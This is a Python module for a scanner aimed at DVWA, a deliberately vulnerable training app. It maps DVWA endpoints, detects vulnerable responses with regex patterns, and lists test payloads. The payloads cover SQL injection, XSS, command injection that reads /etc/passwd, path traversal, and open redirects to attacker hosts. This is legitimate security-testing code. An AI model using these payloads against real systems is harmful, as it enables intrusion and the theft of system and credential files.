"""DVWA-specific vulnerability analyzer with proper endpoint discovery."""
import re
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin


class DVWAAnalyzer:
    """Specialized analyzer for DVWA vulnerable endpoints."""

    # DVWA vulnerable endpoints and their characteristics
    DVWA_VULNERABLE_ENDPOINTS = {
        "/vulnerabilities/sqli/": {
            "type": "SQL Injection",
            "methods": ["get", "post"],
            "parameters": ["id", "user"],
            "indicators": ["database", "mysql", "sql"],
        },
        "/vulnerabilities/xss_r/": {
            "type": "Reflected XSS",
            "methods": ["get"],
            "parameters": ["name"],
            "indicators": ["script", "alert", "payload"],
        },
        "/vulnerabilities/xss_s/": {
            "type": "Stored XSS",
            "methods": ["post", "get"],
            "parameters": ["txtName", "mtxMessage"],
            "indicators": ["guestbook", "comment"],
        },
        "/vulnerabilities/csrf/": {
            "type": "CSRF",
            "methods": ["post", "get"],
            "parameters": ["password_new", "password_conf"],
            "indicators": ["csrf", "token"],
        },
        "/vulnerabilities/weak_id/": {
            "type": "Weak Session ID",
            "methods": ["get"],
            "parameters": ["id"],
            "indicators": ["session", "cookie"],
        },
        "/vulnerabilities/file_upload/": {
            "type": "File Upload",
            "methods": ["post"],
            "parameters": ["uploaded_file"],
            "indicators": ["upload", "file"],
        },
        "/vulnerabilities/file_inclusion/": {
            "type": "Local File Inclusion",
            "methods": ["get"],
            "parameters": ["page"],
            "indicators": ["file", "include", "etc/passwd"],
        },
        "/vulnerabilities/command_injection/": {
            "type": "Command Injection",
            "methods": ["post", "get"],
            "parameters": ["ip"],
            "indicators": ["ping", "shell", "command"],
        },
        "/vulnerabilities/open_redirect/": {
            "type": "Open Redirect",
            "methods": ["get"],
            "parameters": ["redirect"],
            "indicators": ["redirect", "location"],
        },
        "/vulnerabilities/brute_force/": {
            "type": "Brute Force",
            "methods": ["post"],
            "parameters": ["username", "password"],
            "indicators": ["login", "admin"],
        },
    }

    # DVWA difficulty levels - lower difficulty = more obvious vulnerabilities
    DVWA_DIFFICULTIES = ["low", "medium", "high"]

    @staticmethod
    def get_dvwa_vulnerable_endpoints() -> List[str]:
        """Return list of known DVWA vulnerable endpoints."""
        return list(DVWAAnalyzer.DVWA_VULNERABLE_ENDPOINTS.keys())

    @staticmethod
    def get_endpoint_details(endpoint: str) -> Optional[Dict[str, Any]]:
        """Get vulnerability details for a specific endpoint."""
        return DVWAAnalyzer.DVWA_VULNERABLE_ENDPOINTS.get(endpoint)

    @staticmethod
    def is_dvwa_target(base_url: str) -> bool:
        """Determine if target appears to be DVWA."""
        return "dvwa" in base_url.lower() or "localhost:8080" in base_url.lower()

    @staticmethod
    def extract_dvwa_parameters(content: str, endpoint: str) -> Dict[str, str]:
        """Extract parameter names and sample values from DVWA page content."""
        details = DVWAAnalyzer.get_endpoint_details(endpoint)
        if not details:
            return {}

        parameters = {}
        for param in details.get("parameters", []):
            # Look for input fields with parameter names
            patterns = [
                rf'name=["\']?{param}["\']?',
                rf'id=["\']?{param}["\']?',
                rf'<input[^>]*{param}',
            ]

            found = False
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    parameters[param] = "test"
                    found = True
                    break

            # If not found, add default test value anyway
            if not found:
                parameters[param] = "test"

        return parameters

    @staticmethod
    def is_vulnerable_response(
        response_content: str, 
        vulnerability_type: str, 
        payload: str
    ) -> Tuple[bool, str]:
        """Analyze DVWA response for vulnerability indicators."""
        
        if vulnerability_type == "SQL Injection":
            # Check for SQL error messages
            sql_errors = [
                r"mysql_error\(\)",
                r"SQL syntax",
                r"mysql error",
                r"sqlstate",
                r"database error",
                r"syntax error",
                r"near '",
                r"You have an error in your SQL",
            ]
            for pattern in sql_errors:
                if re.search(pattern, response_content, re.IGNORECASE):
                    return True, f"SQL error detected: {pattern}"
            
            # Check if query is reflected with modified content
            if payload in response_content and "SELECT" not in payload:
                return True, "SQL payload reflected in response"
        
        elif vulnerability_type == "Reflected XSS":
            # Check if script payload is reflected unencoded
            if "<script>" in payload and "<script>" in response_content:
                if f"<script>{payload.split('<script>')[1]}" in response_content:
                    return True, "Unencoded script tag reflected"
            
            # Check for event handler reflection
            if "onerror=" in payload and "onerror=" in response_content:
                return True, "Event handler reflected unencoded"
            
            # Check for payload in HTML context
            patterns = [
                rf'<[^>]*{re.escape(payload)}',
                rf'>{re.escape(payload)}<',
            ]
            for pattern in patterns:
                if re.search(pattern, response_content, re.IGNORECASE):
                    return True, "Payload reflected in HTML"
        
        elif vulnerability_type == "Command Injection":
            # Check for command output
            cmd_outputs = [
                r"uid=\d+",  # output of id command
                r"gid=\d+",
                r"/bin/bash",
                r"/bin/sh",
                r"root:x:0:0",  # output of /etc/passwd
                r"Connection reply from",  # ping output
            ]
            for pattern in cmd_outputs:
                if re.search(pattern, response_content, re.IGNORECASE):
                    return True, f"Command output detected: {pattern}"
        
        elif vulnerability_type == "Local File Inclusion":
            # Check for file content
            if "/etc/passwd" in payload and "root:" in response_content:
                return True, "Unix password file content detected"
            if "windows" in payload and ("system32" in response_content or "windows" in response_content):
                return True, "Windows system content detected"
        
        elif vulnerability_type == "Open Redirect":
            # Check for redirect headers or JavaScript redirects
            if "location:" in response_content.lower():
                return True, "HTTP redirect header detected"
            if "window.location" in response_content:
                return True, "JavaScript redirect detected"
        
        return False, ""

    @staticmethod
    def generate_dvwa_payloads(vulnerability_type: str) -> List[str]:
        """Generate DVWA-specific test payloads."""
        
        payloads = {
            "SQL Injection": [
                "' OR '1'='1",
                "admin'--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND 1=1--",
                "' OR 1=1#",
            ],
            "Reflected XSS": [
                "<script>alert('XSS')</script>",
                '"><script>alert("XSS")</script>',
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=\"javascript:alert('XSS')\">",
            ],
            "Stored XSS": [
                "<script>alert('Stored XSS')</script>",
                "<img src=x onerror=alert('Stored')>",
                "<svg onload=alert('Stored')>",
            ],
            "Command Injection": [
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
            ],
            "Local File Inclusion": [
                "../../../etc/passwd",
                "../../../../etc/passwd",
                "....//....//....//etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            ],
            "Open Redirect": [
                "http://evil.com",
                "https://attacker.com",
                "//attacker.com",
                "javascript:alert('Open Redirect')",
            ],
        }
        
        return payloads.get(vulnerability_type, [])
